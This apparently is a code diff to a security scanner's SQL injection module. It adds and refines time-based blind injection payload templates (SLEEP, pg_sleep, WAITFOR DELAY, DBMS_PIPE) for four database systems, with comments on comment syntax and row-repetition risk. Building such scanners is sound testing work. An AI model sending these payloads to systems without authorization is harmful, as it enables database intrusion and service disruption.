@@ -83,21 +83,34 @@ func (p timePair) render(seconds int) string {
 // expression), so MSSQL time-blind is deep / --allow-risky-payloads only. The
 // PostgreSQL ::text OR form stays normal risk: pg_sleep sits in a scalar
 // subquery that the planner evaluates once, not per row.
+//
+// MySQL reads "--" as a comment only when followed by whitespace, so every
+// MySQL comment-terminated form ends "-- -" (the trailing "-" keeps the space
+// from being trimmed). Each backend also has a form that needs no comment at
+// all — the injection closes into the original query's trailing quote
+// (' AND SLEEP(n) AND '1'='1) or concatenates into the string ('||…||') — for
+// sinks that append text after the parameter (MISS-16).
 var stringPayloads = []timePair{
-	{context: "string", dbType: "mysql", template: "' OR SLEEP(%d)--", risk: riskHigh},
-	{context: "string", dbType: "mysql", template: "' AND SLEEP(%d)--"},
+	{context: "string", dbType: "mysql", template: "' OR SLEEP(%d)-- -", risk: riskHigh},
+	{context: "string", dbType: "mysql", template: "' AND SLEEP(%d)-- -"},
+	{context: "string", dbType: "mysql", template: "' AND SLEEP(%d) AND '1'='1"},
 	{context: "string", dbType: "postgres", template: "'; SELECT pg_sleep(%d)--", risk: riskHigh},
 	{context: "string", dbType: "postgres", template: "' OR (SELECT pg_sleep(%d))::text='1'--"},
+	{context: "string", dbType: "postgres", template: "'||(SELECT '' FROM pg_sleep(%d))||'"},
 	{context: "string", dbType: "mssql", template: "'; WAITFOR DELAY '0:0:%d'--", risk: riskHigh},
 	{context: "string", dbType: "mssql", template: "' OR 1=1; WAITFOR DELAY '0:0:%d'--", risk: riskHigh},
 	{context: "string", dbType: "oracle", template: "' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',%d)--", risk: riskHigh},
+	// AND-guarded: the delay runs once per matching row like the MySQL AND form.
+	{context: "string", dbType: "oracle", template: "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',%d)-- -"},
 }
 
 // numericPayloads are payloads for numeric context injection points.
 var numericPayloads = []timePair{
-	{context: "numeric", dbType: "mysql", template: " OR SLEEP(%d)--", risk: riskHigh},
-	{context: "numeric", dbType: "mysql", template: " AND SLEEP(%d)--"},
+	{context: "numeric", dbType: "mysql", template: " OR SLEEP(%d)-- -", risk: riskHigh},
+	{context: "numeric", dbType: "mysql", template: " AND SLEEP(%d)-- -"},
+	{context: "numeric", dbType: "mysql", template: " AND SLEEP(%d)"},
 	{context: "numeric", dbType: "postgres", template: "; SELECT pg_sleep(%d)--", risk: riskHigh},
+	{context: "numeric", dbType: "postgres", template: " AND 1=(SELECT 1 FROM pg_sleep(%d))"},
 	{context: "numeric", dbType: "mssql", template: "; WAITFOR DELAY '0:0:%d'--", risk: riskHigh},
 	{context: "numeric", dbType: "oracle", template: " OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',%d)--", risk: riskHigh},
 }
